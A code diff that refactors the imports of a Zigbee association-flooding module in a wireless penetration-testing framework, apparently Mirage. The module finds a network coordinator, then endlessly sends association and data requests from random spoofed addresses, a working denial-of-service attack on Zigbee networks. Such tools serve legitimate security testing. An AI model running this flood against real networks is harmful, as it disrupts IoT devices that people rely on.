@@ -1,6 +1,10 @@
-from mirage.libs import zigbee,utils,io
-from mirage.core import module
 import random
+
+from mirage.core import module
+from mirage.libs import io, utils
+from mirage.libs.zigbee_utils.helpers import addressToString
+from mirage.libs.zigbee_utils.packets import ZigbeeAssociationRequest, ZigbeeBeacon, ZigbeeBeaconRequest, ZigbeeDataRequest
+
 
 class zigbee_floodassoc(module.WirelessModule):
 	def init(self):
@@ -36,19 +40,19 @@ class zigbee_floodassoc(module.WirelessModule):
 				io.warning("No target specified, Beacon Requests will be transmitted in order to discover the coordinator...")
 				self.target = None
 				while self.target is None:
-					self.emitter.sendp(zigbee.ZigbeeBeaconRequest(sequenceNumber=1,destPanID=self.panid,destAddr=0xFFFF))
+					self.emitter.sendp(ZigbeeBeaconRequest(sequenceNumber=1,destPanID=self.panid,destAddr=0xFFFF))
 					pkt = self.receiver.next(timeout=1)
-					if isinstance(pkt,zigbee.ZigbeeBeacon) and pkt.coordinator and pkt.srcPanID == self.panid:
+					if isinstance(pkt,ZigbeeBeacon) and pkt.coordinator and pkt.srcPanID == self.panid:
 						self.target = pkt.srcAddr
 				
 
-			io.info("Coordinator selected: "+zigbee.addressToString(self.target))
+			io.info("Coordinator selected: "+addressToString(self.target))
 		
 			while True:
 				address = random.randint(0,0xFFFF)
-				io.info("New address: "+zigbee.addressToString(address))
-				self.emitter.sendp(zigbee.ZigbeeAssociationRequest(destPanID=self.panid, destAddr=self.target,srcAddr=address,sequenceNumber=1,deviceType=True,srcPanID=0xFFFF))
-				self.emitter.sendp(zigbee.ZigbeeDataRequest(destPanID=self.panid, destAddr=self.target,srcAddr=address,sequenceNumber=2))
+				io.info("New address: "+addressToString(address))
+				self.emitter.sendp(ZigbeeAssociationRequest(destPanID=self.panid, destAddr=self.target,srcAddr=address,sequenceNumber=1,deviceType=True,srcPanID=0xFFFF))
+				self.emitter.sendp(ZigbeeDataRequest(destPanID=self.panid, destAddr=self.target,srcAddr=address,sequenceNumber=2))
 				utils.wait(seconds=2)
 			return self.ok()
 		else:
